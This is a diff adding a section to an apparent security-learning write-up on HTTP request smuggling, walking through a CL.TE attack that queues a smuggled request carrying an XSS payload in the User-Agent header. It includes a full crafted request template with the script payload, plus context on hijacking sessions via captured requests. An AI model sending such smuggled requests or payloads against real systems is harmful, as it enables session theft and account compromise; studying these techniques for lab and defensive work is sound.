@@ -158,3 +158,34 @@ csrf=<csrf-token>&postId=5&name=Attacker&email=attacker@example.com&website=&com
 * **The Session Hijacking:** The attacker retrieves the stored comment, extracts the victim's `Cookie` header from the captured request, and reuses the session cookie to access the victim's account without knowing their credentials.
 
 * **The Security Impact:** This attack demonstrates that HTTP Request Smuggling can capture requests belonging to other users, leading to session hijacking, credential exposure, and unauthorized account access.
+
+### c. Exploiting HTTP Request Smuggling to Deliver Reflected XSS
+
+* **The Objective:** Exploit a **CL.TE** request smuggling vulnerability to deliver a reflected XSS payload to another user's browser by poisoning the back-end request queue.
+
+* **The Mechanism:** The attacker first identifies that the application reflects the `User-Agent` header inside a hidden HTML input without proper sanitization. A smuggled `GET` request containing a malicious `User-Agent` header is then queued on the back-end connection. When the next user's request is processed, the poisoned request is served first, causing the victim to receive a response containing the reflected XSS payload.
+
+* **Core Layout Structure:**
+
+```http
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: [Calculated Byte Count]
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+* **The Request Poisoning:** The front-end forwards the entire payload based on `Content-Length`, while the back-end stops at the `0` chunk and queues the smuggled `GET` request. The next user's request triggers the processing of the queued request, causing the victim to receive the attacker-controlled response.
+
+* **The XSS Delivery:** Since the application reflects the `User-Agent` header without proper output encoding, the injected payload (`a"/><script>alert(1)</script>`) executes in the victim's browser, resulting in a reflected Cross-Site Scripting (XSS) attack.
+
+* **The Security Impact:** This attack demonstrates that HTTP Request Smuggling can be combined with reflected XSS to deliver client-side payloads to other users, enabling session theft, phishing, malicious JavaScript execution, and account compromise.
